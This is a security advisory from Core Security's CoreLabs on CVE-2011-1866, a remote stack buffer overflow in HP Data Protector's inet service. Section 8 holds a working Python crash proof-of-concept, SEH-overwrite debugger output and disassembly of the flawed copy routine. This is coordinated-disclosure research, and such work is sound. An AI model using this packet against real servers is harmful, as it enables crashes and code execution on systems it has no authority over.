@@ -1,0 +1,312 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+  Core Security Technologies - Corelabs Advisory
+       http://corelabs.coresecurity.com/
+
+  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability
+
+
+1. *Advisory Information*
+
+Title: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability
+Advisory ID: CORE-2011-0606
+Advisory URL:
+http://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability
+Date published: 2011-06-29
+Date of last update: 2011-06-29
+Vendors contacted: HP
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Remote stack overflow [CWE-120]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2011-1866
+
+
+3. *Vulnerability Description*
+
+HP Data Protector [1] is an automated backup and recovery software for
+single-server to enterprise environments. A vulnerability in HP Data
+Protector could allow a remote attacker to execute arbitrary code. The
+vulnerability is triggered by sending a request to port 5555 of a host
+running the "data protector inet" service, part of HP Data Protector.
+
+
+4. *Vulnerable packages*
+
+   . HP OpenView Storage Data Protector v6.20 (running on Windows).
+   . HP OpenView Storage Data Protector v6.11 (running on Windows).
+   . HP OpenView Storage Data Protector v6.10 (running on Windows).
+   . HP OpenView Storage Data Protector v6.00 (running on Windows).
+   . Previous versions may be affected, but were not tested.
+
+
+5. *Non-vulnerable packages*
+
+   . No fixes are available at the time of publication.
+
+
+6. *Vendor Information, Solutions and Workarounds*
+
+HP has issued a security bulletin with document ID c02872182 [2]
+available through HP Support Center at http://www.hp.com/go/HPSC.
+
+The latest version of HP Data Protector is vulnerable to this issue. HP
+has provided the following procedure to mitigate this vulnerability:
+
+   1. Upgrade to Data Protector A.06.20 or subsequent.
+   2. Enable encrypted control communication services on cell server and
+all clients in cell.
+
+ The upgrade is available for download from
+http://hp.com/go/dataprotector then under 'Product Information' click on
+'Trials and Demos'.
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Nahuel C. Riva from
+Core Security Technologies. Publication was coordinated by Carlos Sarraute.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+The following python script can be used to reproduce the bug.
+
+/-----
+import sys
+import socket
+
+from struct import pack
+
+ip = sys.argv[1]
+port = int(sys.argv[2]) # default tcp port 5555
+
+target = (ip, port)
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+
+path = 'A' * 5000
+
+packet =  pack('<L', 0x20003220)
+packet += pack('<L', 0x00302000)
+packet += '\x20'
+packet += pack('>H', 0x0020)
+packet += pack('<L', 0x00432000)
+packet += pack('<L', 0x00303220)
+packet += '\x20'
+packet += 'omnicheck.exe'
+packet += pack('>H', 0x0020)
+packet += pack('>H', 0x0020) * 4
+packet += pack('<L', 0x30200030)
+packet += pack('>H', 0x0020)
+packet += path
+packet += pack('>H', 0x0000)
+
+plen = pack('>L', len(packet))
+
+s.send(plen + packet)
+
+- -----/
+ By executing this script, the omniinet.exe process crashes in the
+following EIP:
+
+/-----
+7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]
+7C8285D6    8BE5             MOV ESP,EBP
+7C8285D8    5D               POP EBP
+7C8285D9    C3               RETN
+        
+- -----/
+ This is part of a function inside the ntdll.dll library, however, if we
+look the SEH chain, we can see that the SEH handler was overwritten with
+the value 0x00410041 (the unicode value for "AA"):
+
+/-----
+SEH chain of thread 00000578
+Address    SE handler
+009AFF94   omniinet.00410041
+00410041   A3004472
+        
+- -----/
+ The following are the values of the CPU registers at the time of the
+crash:
+
+/-----
+EAX C0000008
+ECX 009AEC98
+EDX 7C82859C ntdll.KiRaiseUserExceptionDispatcher
+EBX 0015B480
+ESP 009AEC44
+EBP 009AEC94
+ESI 00155A80
+EDI 00000000
+EIP 7C8285D3 ntdll.7C8285D3
+C 0  ES 0023 32bit 0(FFFFFFFF)
+P 1  CS 001B 32bit 0(FFFFFFFF)
+A 0  SS 0023 32bit 0(FFFFFFFF)
+Z 0  DS 0023 32bit 0(FFFFFFFF)
+S 0  FS 003B 32bit 7FFDB000(FFF)
+T 0  GS 0000 NULL
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00000206 (NO,NB,NE,A,NS,PE,GE,G)
+ST0 empty 0.0
+ST1 empty 0.0
+ST2 empty 0.0
+ST3 empty 0.0
+ST4 empty 0.0
+ST5 empty 0.0
+ST6 empty 0.7610000000000000098
+ST7 empty 1.0000000000000000000
+               3 2 1 0      E S P U O Z D I
+FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
+FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1
+        
+- -----/
+ The problem is in the 0041D170 function. This function does a blind
+copy of the string passed in the packet as a path:
+
+/-----
+0041D170     /$ 55             PUSH EBP
+0041D171     |. 8BEC           MOV EBP,ESP
+0041D173     |. 51             PUSH ECX
+0041D174     |. 8B45 08        MOV EAX,DWORD PTR SS:[EBP+8]
+0041D177     |. 8945 FC        MOV DWORD PTR SS:[EBP-4],EAX
+0041D17A     |. 8B4D 08        MOV ECX,DWORD PTR SS:[EBP+8]
+0041D17D     |. 0FB711         MOVZX EDX,WORD PTR DS:[ECX]
+0041D180     |. 85D2           TEST EDX,EDX
+0041D182     |. 74 73          JE SHORT omniinet.0041D1F7
+[...]
+0041D1F7     |> 8B45 0C        /MOV EAX,DWORD PTR SS:[EBP+C]
+0041D1FA     |. 0FB708         |MOVZX ECX,WORD PTR DS:[EAX]
+0041D1FD     |. 85C9           |TEST ECX,ECX
+0041D1FF     |. 74 26          |JE SHORT omniinet.0041D227
+0041D201     |. 8B55 08        |MOV EDX,DWORD PTR SS:[EBP+8]
+0041D204     |. 8955 FC        |MOV DWORD PTR SS:[EBP-4],EDX
+0041D207     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]
+0041D20A     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]
+0041D20D     |. 66:8B11        |MOV DX,WORD PTR DS:[ECX]
+0041D210     |. 66:8910        |MOV WORD PTR DS:[EAX],DX // copy WORDs
+to the stack
+0041D213     |. 8B45 08        |MOV EAX,DWORD PTR SS:[EBP+8]
+0041D216     |. 83C0 02        |ADD EAX,2
+0041D219     |. 8945 08        |MOV DWORD PTR SS:[EBP+8],EAX
+0041D21C     |. 8B4D 0C        |MOV ECX,DWORD PTR SS:[EBP+C]
+0041D21F     |. 83C1 02        |ADD ECX,2
+0041D222     |. 894D 0C        |MOV DWORD PTR SS:[EBP+C],ECX
+0041D225     |.^EB D0          \JMP SHORT omniinet.0041D1F7
+0041D227     |> 8B55 08        MOV EDX,DWORD PTR SS:[EBP+8]
+0041D22A     |. 66:C702 0000   MOV WORD PTR DS:[EDX],0
+0041D22F     |. 8B45 FC        MOV EAX,DWORD PTR SS:[EBP-4]
+0041D232     |. 8BE5           MOV ESP,EBP
+0041D234     |. 5D             POP EBP
+0041D235     \. C3             RETN
+        
+- -----/
+
+
+
+9. *Report Timeline*
+
+. 2011-06-06:
+Core Security Technologies notifies the HP team of the vulnerabilities
+and provides the technical details. Publication date is temporarily set
+to July 5th, 2011.
+
+. 2011-06-06:
+Vendor confirms that a new case was assigned within HP Software Security
+Response Team (SSRT).
+
+. 2011-06-16:
+Core requests an update on this issue, in particular Core asks the
+vendor for a technical analysis of the bugs, a list of affected products
+and versions, and the vendor's plan for providing a fix (no reply
+received).
+
+. 2011-06-23:
+Core requests once more an update.
+
+. 2011-06-28:
+Vendor communicates that a security bulletin will be issued on the same
+day (June 28). The vendor confirms the vulnerabilities, and recommends
+as mitigation to enable encrypted communications in the cell server and
+client.
+
+. 2011-06-28:
+Core requests a link to the vendor's bulletin, and asks whether CVE ids
+have been assigned.
+
+. 2011-06-28:
+Vendor provides a link to the bulletin and CVE names for the
+vulnerabilities.
+
+. 2011-06-29:
+Advisory CORE-2011-0606 is published.
+
+
+
+10. *References*
+
+[1] HP Data Protector http://hp.com/go/dataprotector
+[2] HPSBMU02686 SSRT100541 rev.2 - HP OpenView Storage Data Protector,
+Remote Execution of Arbitrary Code
+http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02872182
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2011 Core Security
+Technologies and (c) 2011 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (MingW32)
+
+iEYEARECAAYFAk4LnZsACgkQyNibggitWa07/ACfSlzkBvbowAskeP/K4FqtxCay
+EAkAnRCPKdc35t5Cb0ZJbGy4me4JRALo
+=zHon
+-----END PGP SIGNATURE-----
